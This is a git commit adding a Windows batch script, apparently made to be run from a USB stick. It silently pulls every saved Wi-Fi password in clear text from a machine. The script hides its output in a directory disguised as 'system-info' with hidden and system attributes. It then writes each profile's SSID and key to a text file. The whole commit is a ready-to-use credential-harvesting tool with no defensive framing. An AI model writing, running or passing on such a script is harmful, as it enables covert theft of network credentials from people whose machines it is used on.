f5c11e549e4261e7714b47e3189dadbea1281313
infosecZombie <69755943+infosecZombie@users.noreply.github.com>
2023-08-19 07:16:30 +0500

    Add files via upload

---
+++ WIFI Password Extractor/Wifi_Extractor_USB_old.bat
@@ -0,0 +1,21 @@
+:::: Run as Admin, This Batch file extracts the wifi passwords in clear text :::::: 
+
+@echo off
+
+:::::: 1. Creating Main Hidden Directory ::::::
+
+if NOT EXIST system-info (
+md system-info
+attrib +h +s system-info
+cd system-info
+) ELSE (
+cd system-info
+)
+
+:::::: 2. Creating Directory for user ::::::
+set user=%USERDOMAIN%_%USERNAME%
+md %user%
+cd %user%
+
+:::::: 3. Extracting Wifi Passwords to file ::::::
+for /f "skip=9 tokens=1-4* delims= " %%a in ('netsh wlan show profiles') do @netsh wlan show profile name="%%e" key=clear | findstr /c:"SSID name" /c:"Key Content" >> wifi.txt && echo. >> wifi.txt
